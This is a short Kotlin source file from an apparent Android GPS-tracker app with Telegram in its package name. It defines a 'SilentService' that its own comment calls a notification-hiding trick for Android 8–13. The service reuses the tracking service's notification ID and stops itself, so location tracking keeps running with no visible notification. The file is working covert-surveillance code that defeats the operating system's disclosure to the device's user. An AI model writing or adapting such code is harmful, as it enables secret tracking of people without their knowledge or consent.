package com.gpstracker.telegram

import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat

/**
 * Notification-hiding trick (works Android 8–13):
 *
 * Both this service and LocationTrackingService call startForeground()
 * with the SAME notification ID. When this service immediately calls
 * stopSelf(), Android removes that notification ID from the shade —
 * but LocationTrackingService keeps running silently as a foreground
 * service with no visible notification.
 */
class SilentService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channel = LocationTrackingService.CHANNEL_ID
        val note = NotificationCompat.Builder(this, channel)
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build()
        startForeground(LocationTrackingService.NOTIFICATION_ID, note)
        stopSelf()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
